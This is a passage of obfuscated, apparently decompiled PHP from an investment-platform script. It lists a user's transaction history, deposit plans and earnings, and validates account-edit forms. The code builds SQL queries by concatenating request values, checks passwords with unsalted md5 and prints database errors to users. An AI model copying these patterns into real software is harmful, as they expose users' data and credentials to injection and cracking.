                            if ($elnlcCgqPK[$elnlcsyENS['elnlcsMIe']] == $elnlcsyENS['elnlcaJFAl'])
                            {
                              continue;
                            }

                            $elnlcCgqPK[$elnlcsyENS['elnlcAIkl']] = $elnlcvHtR[$elnlcCgqPK[$elnlcsyENS['elnlcsMIe']]];
                            $elnlcCgqPK[$elnlcsyENS['elnlcNweHp']] = ($elnlcCgqPK[$elnlcsyENS['elnlcsMIe']] == $elnlcWodOE[$elnlcsyENS['elnlcsMIe']] ? 1 : 0);
                            if ($elnlcgNwD == $elnlcCgqPK[$elnlcsyENS['elnlcsMIe']])
                            {
                              $elnlccJqA = $elnlcsyENS['elnlctNxTK'];
                            }

                            array_push ($elnlcJNpjH, $elnlcCgqPK);
                          }

                          $elnlcfhFg->assign ('options', $elnlcJNpjH);
                          $elnlcuBUM = '';
                          if ($elnlccJqA)
                          {
                            if ($elnlcgNwD == $elnlcsyENS['elnlcJmFM'])
                            {
                              $elnlcuBUM = ' and (type = \'exchange_in\' or type = \'exchange_out\') ';
                            }
                            else
                            {
                              $elnlcANPi = elnlcnczen ($elnlcgNwD);
                              $elnlcuBUM = '' . ' and type = \'' . $elnlcANPi . '\' ';
                            }
                          }

                          $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcHSUz']]);
                          $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcmEWD']]);
                          $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcMeCs']]);
                          $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']]);
                          $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcgjPm']]);
                          $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = sprintf ('%d', $elnlcWodOE[$elnlcsyENS['elnlcQwVC']]);
                          if ($elnlcWodOE[$elnlcsyENS['elnlcHSUz']] == 0)
                          {
                            $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] = date ('j', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                            $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] = date ('n', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                            $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] = date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60);
                            $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] = $elnlcsyENS['elnlctNxTK'];
                            $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] = $elnlcWodOE[$elnlcsyENS['elnlcmEWD']];
                            $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] = $elnlcWodOE[$elnlcsyENS['elnlcMeCs']];
                          }

                          $elnlckeTje = '\'' . $elnlcWodOE[$elnlcsyENS['elnlcQwVC']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcgjPm']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcsgzTh']] . '\' + interval 0 day < date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour and ' . '\'' . $elnlcWodOE[$elnlcsyENS['elnlcMeCs']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcmEWD']] . '-' . $elnlcWodOE[$elnlcsyENS['elnlcHSUz']] . '\' + interval 1 day > date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour ';
                          $elnlcnIdT = '';
                          if ($elnlcWodOE[ec] == '')
                          {
                            $elnlcWodOE[ec] = -1;
                          }

                          $elnlciSebT = sprintf ('%d', $elnlcWodOE[ec]);
                          if (-1 < $elnlcWodOE[ec])
                          {
                            $elnlcnIdT = '' . ' and ec = ' . $elnlciSebT;
                          }

                          $q = '' . 'select count(*) as c_all from hm2_history where ' . $elnlckeTje . ' ' . $elnlcuBUM . ' ' . $elnlcnIdT . ' and user_id = ' . $elnlckapu;
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          $elnlcrldqi = $elnlcCgqPK[$elnlcsyENS['elnlcKrRIE']];
                          $elnlcBVch = $elnlcWodOE[$elnlcsyENS['elnlcoRdoK']];
                          $elnlcnAdtA = $elnlcsyENS['elnlcUKVo'];
                          $elnlcfKwd = ceil ($elnlcrldqi / $elnlcnAdtA);
                          if ($elnlcBVch <= 1)
                          {
                            $elnlcBVch = $elnlcsyENS['elnlctNxTK'];
                          }

                          if (($elnlcfKwd < $elnlcBVch AND 1 <= $elnlcfKwd))
                          {
                            $elnlcBVch = $elnlcfKwd;
                          }

                          $elnlcQVmJ = ($elnlcBVch - 1) * $elnlcnAdtA;
                          $elnlckCfG = ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']] ? 'asc' : 'desc');
                          $elnlcGwoqs = ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']] ? '%b-%e-%Y<br>%r' : '%b-%e-%Y %r');
                          $q = 'select *, date_format(date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ('' . ' hour, \'' . $elnlcGwoqs . '\') as d from hm2_history where ' . $elnlckeTje . ' ' . $elnlcuBUM . ' ' . $elnlcnIdT . ' and user_id = ' . $elnlckapu . ' order by date ' . $elnlckCfG . ', id ' . $elnlckCfG . ' limit ' . $elnlcQVmJ . ', ' . $elnlcnAdtA);
                          ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                          $elnlcgDhFp = array ();
                          while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                          {
                            $elnlcCgqPK[$elnlcsyENS['elnlcCooj']] = $elnlcvHtR[$elnlcCgqPK[$elnlcsyENS['elnlcsMIe']]];
                            $elnlcCgqPK[$elnlcsyENS['elnlcBwTp']] = ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] < 0 ? 1 : 0);
                            $elnlcCgqPK[$elnlcsyENS['elnlcvQExl']] = $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']];
                            $elnlcCgqPK[$elnlcsyENS['elnlcAwVw']] = number_format (abs ($elnlcCgqPK[$elnlcsyENS['elnlcAwVw']]), 2);
                            array_push ($elnlcgDhFp, $elnlcCgqPK);
                            ++$i;
                          }

                          if ($elnlcSuVc[$elnlcsyENS['elnlcfuHxt']])
                          {
                            for ($i = $elnlcsyENS['elnlcmjUx']; $i < sizeof ($elnlcgDhFp); ++$i)
                            {
                              $elnlcVhxW = $elnlcgDhFp[$i][$elnlcsyENS['elnlcLbvLL']];
                              $q = '' . 'select sum(actual_amount) as balance from hm2_history where id < ' . $elnlcVhxW . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                              $elnlchGkPU = mysql_query ($q);
                              $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                              $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                              $elnlcgDhFp[$i][$elnlcsyENS['elnlcTcMv']] = number_format ($elnlcewnve + $elnlcgDhFp[$i][$elnlcsyENS['elnlcvQExl']], 2);
                            }

                            $q = '' . 'select
            sum(actual_amount * (actual_amount < 0)) as debit,
            sum(actual_amount * (actual_amount > 0)) as credit,
            sum(actual_amount) as balance
          from
            hm2_history where ' . $elnlckeTje . ' ' . $elnlcuBUM . ' ' . $elnlcnIdT . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                            $elnlchGkPU = mysql_query ($q);
                            $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                            $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                            $elnlcairsl = $elnlcCgqPK[$elnlcsyENS['elnlcmSjoq']];
                            $elnlcnDGD = $elnlcCgqPK[$elnlcsyENS['elnlcJWWpc']];
                            $elnlcqMqEH = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                            $elnlcfhFg->assign ('perioddebit', number_format (abs ($elnlcairsl), 2));
                            $elnlcfhFg->assign ('periodcredit', number_format (abs ($elnlcnDGD), 2));
                            $elnlcfhFg->assign ('periodbalance', number_format ($elnlcqMqEH, 2));
                            $q = '' . 'select
            sum(actual_amount * (actual_amount < 0)) as debit,
            sum(actual_amount * (actual_amount > 0)) as credit,
            sum(actual_amount) as balance
          from
            hm2_history where 1=1 ' . $elnlcuBUM . ' ' . $elnlcnIdT . ' and user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']];
                            $elnlchGkPU = mysql_query ($q);
                            $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                            $elnlcewnve = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                            $elnlcairsl = $elnlcCgqPK[$elnlcsyENS['elnlcmSjoq']];
                            $elnlcnDGD = $elnlcCgqPK[$elnlcsyENS['elnlcJWWpc']];
                            $elnlcqMqEH = $elnlcCgqPK[$elnlcsyENS['elnlcTcMv']];
                            $elnlcfhFg->assign ('alldebit', number_format (abs ($elnlcairsl), 2));
                            $elnlcfhFg->assign ('allcredit', number_format (abs ($elnlcnDGD), 2));
                            $elnlcfhFg->assign ('allbalance', number_format ($elnlcqMqEH, 2));
                          }

                          $elnlcdwLbF = array ();
                          for ($i = $elnlcsyENS['elnlctNxTK']; $i <= $elnlcfKwd; ++$i)
                          {
                            $elnlcyNBa = array ();
                            $elnlcyNBa[$elnlcsyENS['elnlcoRdoK']] = $i;
                            $elnlcyNBa[$elnlcsyENS['elnlcCdoEa']] = ($i == $elnlcBVch ? 1 : 0);
                            array_push ($elnlcdwLbF, $elnlcyNBa);
                          }

                          $elnlcfhFg->assign ('pages', $elnlcdwLbF);
                          $elnlcfhFg->assign ('colpages', $elnlcfKwd);
                          $elnlcfhFg->assign ('current_page', $elnlcBVch);
                          if (1 < $elnlcBVch)
                          {
                            $elnlcfhFg->assign ('prev_page', $elnlcBVch - 1);
                          }

                          if ($elnlcBVch < $elnlcfKwd)
                          {
                            $elnlcfhFg->assign ('next_page', $elnlcBVch + 1);
                          }

                          $q = '' . 'select sum(actual_amount) as sum from hm2_history where ' . $elnlckeTje . ' ' . $elnlcnIdT . ' and user_id = ' . $elnlckapu . ' ' . $elnlcuBUM;
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          $elnlcUaCVg = $elnlcCgqPK[$elnlcsyENS['elnlcHSGM']];
                          $elnlcfhFg->assign ('periodsum', number_format ($elnlcUaCVg, 2));
                          $q = '' . 'select sum(actual_amount) as sum from hm2_history where user_id = ' . $elnlckapu . ' ' . $elnlcuBUM . ' ' . $elnlcnIdT;
                          $elnlchGkPU = mysql_query ($q);
                          $elnlcCgqPK = mysql_fetch_array ($elnlchGkPU);
                          $elnlcWNITs = $elnlcCgqPK[$elnlcsyENS['elnlcHSGM']];
                          $elnlcfhFg->assign ('allsum', number_format ($elnlcWNITs, 2));
                          $elnlcdRCR = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcsyENS['elnlctqSz']);
                          $elnlcfhFg->assign ('month', $elnlcdRCR);
                          $elnlcRaue = array ();
                          for ($i = $elnlcsyENS['elnlctNxTK']; $i <= 31; ++$i)
                          {
                            array_push ($elnlcRaue, $i);
                          }

                          $elnlcfhFg->assign ('day', $elnlcRaue);
                          $elnlczLFnQ = array ();
                          for ($i = $elnlcSuVc[$elnlcsyENS['elnlcArER']]; $i <= date ('Y', time () + $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] * 60 * 60); ++$i)
                          {
                            array_push ($elnlczLFnQ, $i);
                          }

                          $elnlcfhFg->assign ('year', $elnlczLFnQ);
                          $elnlcfhFg->assign ('trans', $elnlcgDhFp);
                          $elnlcfhFg->assign ('qtrans', sizeof ($elnlcgDhFp));
                          $elnlcIDVlb = array ();
                          foreach ($elnlcGPfS as $elnlckapu => $elnlcoFEhc)
                          {
                            if ($elnlcoFEhc[status] == 1)
                            {
                              $elnlcoFEhc[id] = $elnlckapu;
                              array_push ($elnlcIDVlb, $elnlcoFEhc);
                              continue;
                            }
                          }

                          if (1 < sizeof ($elnlcIDVlb))
                          {
                            $elnlcfhFg->assign ('ecs', $elnlcIDVlb);
                          }

                          $elnlcfhFg->assign ('frm', $elnlcWodOE);
                          $elnlcfhFg->display ($elnlcsyENS['elnlcTneWU']);
                          print base64_decode ('Cg==
');
                        }
                        else
                        {
                          if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcaGHaA'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                          {
                            $q = 'select * from hm2_types where status = \'on\' order by ordering';
                            ($elnlchGkPU = mysql_query ($q) OR print mysql_error ());
                            $elnlczhuc = array ();
                            $elnlcfWPmm = $elnlcsyENS['elnlcmjUx'];
                            while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
                            {
                              $elnlcCgqPK[$elnlcsyENS['elnlcjqTvi']] = array ();
                              $q = 'select * from hm2_plans where parent = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . ' order by id';
                              if (!($elnlcjSNE = mysql_query ($q)))
                              {
                                exit (mysql_error ());
                                (bool)true;
                              }

                              $elnlcCgqPK[$elnlcsyENS['elnlcKBthk']] = array ();
                              while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                              {
                                $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = '';
                                if ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']] == 0)
                                {
                                  $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' and more';
                                }
                                else
                                {
                                  $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcwFTQ']]) . ' - ' . $elnlcSuVc[currency_sign] . number_format ($elnlcUpbus[$elnlcsyENS['elnlcMFyGk']]);
                                }

                                array_push ($elnlcCgqPK[$elnlcsyENS['elnlcKBthk']], $elnlcUpbus);
                              }

                              $elnlcweII = array ('d' => 'Daily', 'w' => 'Weekly', 'b-w' => 'Bi Weekly', 'm' => 'Monthly', '2m' => '2 Monthly', '3m' => '3 Monthly', '6m' => '6 Monthly', 'h' => 'Hourly', 'y' => $elnlcsyENS['elnlcRzpur']);
                              $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] = $elnlcCgqPK[$elnlcsyENS['elnlcdryi']];
                              $elnlcCgqPK[$elnlcsyENS['elnlcdryi']] = $elnlcweII[$elnlcCgqPK[$elnlcsyENS['elnlcdryi']]];
                              $q = 'select
                *,
                date_format(deposit_date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour, \'%b-%e-%Y %r\') as date,
                (to_days(now()) - to_days(deposit_date)) as duration,
                (to_days(now()) - to_days(deposit_date) - ' . $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']] . ('' . ') as pending_duration,
                IF (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'d\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                	if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'w\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                		if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'b-w\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                			if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'m\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                				if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'2m\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                				if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'3m\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                				if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'6m\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                				if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'h\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                				if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'y\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                				if (\'' . $elnlcCgqPK[$elnlcsyENS['elnlcNBsGo']] . '\' = \'end\', to_days(deposit_date + interval ' . $elnlcCgqPK[$elnlcsyENS['elnlcJSvGA']] . ' day) - to_days(now()),
                				\'never\'
                				  )))
                				  )))
                				   ))))  as expire_in
          from
                hm2_deposits
          where
                user_id = ') . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
                status=\'on\' and
                type_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']] . '
          order by
                deposit_date
         ';
                              ($elnlcjSNE = mysql_query ($q) OR print mysql_error ());
                              $d = array ();
                              while ($elnlcUpbus = mysql_fetch_array ($elnlcjSNE))
                              {
                                array_push ($d, $elnlcUpbus[id]);
                                $elnlcUpbus[$elnlcsyENS['elnlcKAtV']] = $elnlcsyENS['elnlctNxTK'];
                                if ($elnlcCgqPK[$elnlcsyENS['elnlcIUuj']] == 0)
                                {
                                  $elnlcUpbus[$elnlcsyENS['elnlcKAtV']] = $elnlcsyENS['elnlcmjUx'];
                                }
                                else
                                {
                                  if ($elnlcUpbus[$elnlcsyENS['elnlcjKaDI']] < $elnlcCgqPK[$elnlcsyENS['elnlcOhgyp']])
                                  {
                                    $elnlcUpbus[$elnlcsyENS['elnlcKAtV']] = $elnlcsyENS['elnlcmjUx'];
                                  }

                                  if (($elnlcCgqPK[$elnlcsyENS['elnlclogQB']] != 0 AND $elnlcCgqPK[$elnlcsyENS['elnlclogQB']] <= $elnlcUpbus[$elnlcsyENS['elnlcjKaDI']]))
                                  {
                                    $elnlcUpbus[$elnlcsyENS['elnlcKAtV']] = $elnlcsyENS['elnlcmjUx'];
                                  }
                                }

                                if (($elnlcSuVc[program_version] == $elnlcsyENS['elnlcNgInk'] AND $elnlcSuVc[license] == $elnlcsyENS['elnlcldIL']))
                                {
                                  $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = number_format (floor ($elnlcUpbus[$elnlcsyENS['elnlcAwVw']] * 1000000) / 1000000, 2);
                                }
                                else
                                {
                                  $elnlcUpbus[$elnlcsyENS['elnlcOBsC']] = number_format (floor ($elnlcUpbus[$elnlcsyENS['elnlcAwVw']] * 100) / 100, 2);
                                }

                                $elnlcUpbus[$elnlcsyENS['elnlccdExO']] = sprintf ('%.02f', $elnlcUpbus[$elnlcsyENS['elnlccdExO']]);
                                $elnlcUpbus[$elnlcsyENS['elnlcImRdI']] = 0 - $elnlcUpbus[$elnlcsyENS['elnlcImRdI']];
                                array_push ($elnlcCgqPK[$elnlcsyENS['elnlcjqTvi']], $elnlcUpbus);
                                $elnlcfWPmm += $elnlcUpbus[$elnlcsyENS['elnlcAwVw']];
                              }

                              $q = 'select
            sum(hm2_history.actual_amount) as sm
          from
            hm2_history, hm2_deposits
          where
            hm2_history.deposit_id = hm2_deposits.id and
            hm2_history.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
            hm2_deposits.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
            hm2_history.type=\'deposit\' and
            hm2_deposits.type_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                              $elnlcjSNE = mysql_query ($q);
                              $elnlcUpbus = mysql_fetch_array ($elnlcjSNE);
                              $elnlcCgqPK[$elnlcsyENS['elnlcorvL']] = number_format (abs ($elnlcUpbus[$elnlcsyENS['elnlcwSUpn']]), 2);
                              $q = 'select
            sum(hm2_history.actual_amount) as sm
          from
            hm2_history, hm2_deposits
          where
            hm2_history.deposit_id = hm2_deposits.id and
            hm2_history.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
            hm2_deposits.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
            hm2_history.type=\'earning\' and
            to_days(hm2_history.date + interval ' . $elnlcSuVc[$elnlcsyENS['elnlcjWWW']] . ' hour) = to_days(now()) and
            hm2_deposits.type_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                              $elnlcjSNE = mysql_query ($q);
                              $elnlcUpbus = mysql_fetch_array ($elnlcjSNE);
                              $elnlcCgqPK[$elnlcsyENS['elnlcnxcQ']] = number_format (abs ($elnlcUpbus[$elnlcsyENS['elnlcwSUpn']]), 2);
                              $q = 'select
            sum(hm2_history.actual_amount) as sm
          from
            hm2_history, hm2_deposits
          where
            hm2_history.deposit_id = hm2_deposits.id and
            hm2_history.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
            hm2_deposits.user_id = ' . $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] . ' and
            hm2_history.type=\'earning\' and
            hm2_deposits.type_id = ' . $elnlcCgqPK[$elnlcsyENS['elnlcLbvLL']];
                              $elnlcjSNE = mysql_query ($q);
                              $elnlcUpbus = mysql_fetch_array ($elnlcjSNE);
                              $elnlcCgqPK[$elnlcsyENS['elnlcPCvUa']] = number_format (abs ($elnlcUpbus[$elnlcsyENS['elnlcwSUpn']]), 2);
                              if ((!$elnlcCgqPK[$elnlcsyENS['elnlcjqTvi']] AND $elnlcCgqPK[$elnlcsyENS['elnlcadRfR']] != 0))
                              {
                                continue;
                              }

                              array_push ($elnlczhuc, $elnlcCgqPK);
                            }

                            $elnlcfhFg->assign ('plans', $elnlczhuc);
                            $elnlcfhFg->assign ('total', number_format ($elnlcfWPmm, 2));
                            $elnlcfhFg->display ($elnlcsyENS['elnlcxTjuN']);
                          }
                          else
                          {
                            if (($elnlcWodOE[$elnlcsyENS['elnlcxxLz']] == $elnlcsyENS['elnlcGDADc'] AND $elnlcgcnET[$elnlcsyENS['elnlcpicy']] == 1))
                            {
                              if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcpcHa'])
                              {
                                $elnlcfhFg->assign ('say', $elnlcWodOE[$elnlcsyENS['elnlciKgs']]);
                                $elnlcfhFg->display ($elnlcsyENS['elnlcpUTK']);
                                elnlcnooln ($elnlcUazB);
                                exit ();
                              }

                              if ($elnlcWodOE[$elnlcsyENS['elnlcevKUa']] == $elnlcsyENS['elnlcGDADc'])
                              {
                                if (($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1 AND $elnlcgcnET[$elnlcsyENS['elnlcLbvLL']] < 3))
                                {
                                  header ('Location: ?a=edit_account');
                                  exit ();
                                }

                                $elnlcjPews = array ();
                                if ($elnlcWodOE[$elnlcsyENS['elnlcrsPe']] != 'confirm')
                                {
                                  if ($elnlcWodOE[$elnlcsyENS['elnlcToEDy']] == '')
                                  {
                                    array_push ($elnlcjPews, $elnlcsyENS['elnlcoxcC']);
                                  }

                                  if ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']] != '')
                                  {
                                    if ($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcEuerH'])
                                    {
                                      if (md5 ($elnlcWodOE[$elnlcsyENS['elnlcWOLk']]) != $elnlcgcnET[$elnlcsyENS['elnlcuNxa']])
                                      {
                                        array_push ($elnlcjPews, $elnlcsyENS['elnlcbTTCV']);
                                      }
                                    }

                                    if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
                                    {
                                      if (strlen ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
                                      {
                                        array_push ($elnlcjPews, $elnlcsyENS['elnlcJsvnm']);
                                      }
                                    }

                                    if ($elnlcWodOE[$elnlcsyENS['elnlcuNxa']] != $elnlcWodOE[$elnlcsyENS['elnlcLvmm']])
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlcatfI']);
                                    }
                                  }

                                  if (($elnlcSuVc[$elnlcsyENS['elnlcTrIn']] AND $elnlcWodOE[$elnlcsyENS['elnlcdktEr']] == ''))
                                  {
                                    array_push ($elnlcjPews, $elnlcsyENS['elnlcIRydS']);
                                  }

                                  if ($elnlcSuVc[$elnlcsyENS['elnlctckv']])
                                  {
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcJbVmx']] == '')
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlcJiab']);
                                    }

                                    if ($elnlcWodOE[$elnlcsyENS['elnlcDpTMB']] == '')
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlcvVyQ']);
                                    }

                                    if ($elnlcWodOE[$elnlcsyENS['elnlcggahQ']] == '')
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlciUyfr']);
                                    }

                                    if ($elnlcWodOE[$elnlcsyENS['elnlcyCqK']] == '')
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlclcLy']);
                                    }

                                    if ($elnlcWodOE[$elnlcsyENS['elnlcyCqK']] == '')
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlcDEsC']);
                                    }
                                  }

                                  if (($elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcMTWKT'] OR $elnlcSuVc[$elnlcsyENS['elnlcIrtRw']] == $elnlcsyENS['elnlcutzo']))
                                  {
                                    if ($elnlcWodOE[$elnlcsyENS['elnlccumw']] != $elnlcgcnET[$elnlcsyENS['elnlcOamyf']])
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlcdlSF']);
                                    }
                                  }

                                  if ($elnlcSuVc[$elnlcsyENS['elnlcofaw']] == 1)
                                  {
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcfACa']] != $elnlcgcnET[$elnlcsyENS['elnlcAIMpf']])
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlcJkNB']);
                                    }
                                  }

                                  if ($elnlcSuVc[$elnlcsyENS['elnlcEiLvm']])
                                  {
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != '')
                                    {
                                      if ($elnlcWodOE[$elnlcsyENS['elnlcfACa']] == $elnlcgcnET[$elnlcsyENS['elnlcAIMpf']])
                                      {
                                        if (0 < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
                                        {
                                          if (strlen ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']]) < $elnlcSuVc[$elnlcsyENS['elnlcmxdQs']])
                                          {
                                            array_push ($elnlcjPews, $elnlcsyENS['elnlcCsKL']);
                                          }
                                        }

                                        if ($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != $elnlcWodOE[$elnlcsyENS['elnlcbIkl']])
                                        {
                                          array_push ($elnlcjPews, $elnlcsyENS['elnlcHxVzV']);
                                        }
                                      }
                                      else
                                      {
                                        array_push ($elnlcjPews, $elnlcsyENS['elnlcJkNB']);
                                      }
                                    }

                                    if ((($elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] != '' AND $elnlcWodOE[$elnlcsyENS['elnlcuNxa']] != '') AND $elnlcWodOE[$elnlcsyENS['elnlcAIMpf']] == $elnlcWodOE[$elnlcsyENS['elnlcuNxa']]))
                                    {
                                      array_push ($elnlcjPews, $elnlcsyENS['elnlcMeOB']);
                                    }
                                  }
                                }

                                if (sizeof ($elnlcjPews) == 0)
                                {
                                  if ($elnlcSuVc[$elnlcsyENS['elnlcMIrlF']] == 1)
                                  {
                                    session_start ();
                                    if ($elnlcWodOE[$elnlcsyENS['elnlcrsPe']] == $elnlcsyENS['elnlcpcHa'])
                                    {
                                      if ($_SESSION[$elnlcsyENS['elnlcJpyR']] == $elnlcWodOE[$elnlcsyENS['elnlcJpyR']])
                                      {
                                        if (is_array ($_SESSION[$elnlcsyENS['elnlcVLuoO']]))
                                        {
                                          $elnlcWodOE = array_merge ((array)$elnlcWodOE, (array)$_SESSION[$elnlcsyENS['elnlcVLuoO']]);
                                        }
                                        else
                                        {
                                          header ('Location: ?a=edit_account');
                                          elnlcnooln ($elnlcUazB);
                                          exit ();
                                        }
                                      }
                                      else
                                      {
                                        header ('Location: ?a=edit_account&action=confirm&say=invalid_code');
                                        elnlcnooln ($elnlcUazB);
                                        exit ();
                                      }
                                    }
                                    else
                                    {
                                      $elnlcTCRD = elnlcpfqe (50);
                                      $_SESSION[$elnlcsyENS['elnlcJpyR']] = $elnlcTCRD;
                                      $_SESSION[$elnlcsyENS['elnlcVLuoO']] = $elnlcWodOE;
                                      $elnlcRuFoK = array ();
                                      $elnlcRuFoK[$elnlcsyENS['elnlcIAHdF']] = $elnlcTCRD;
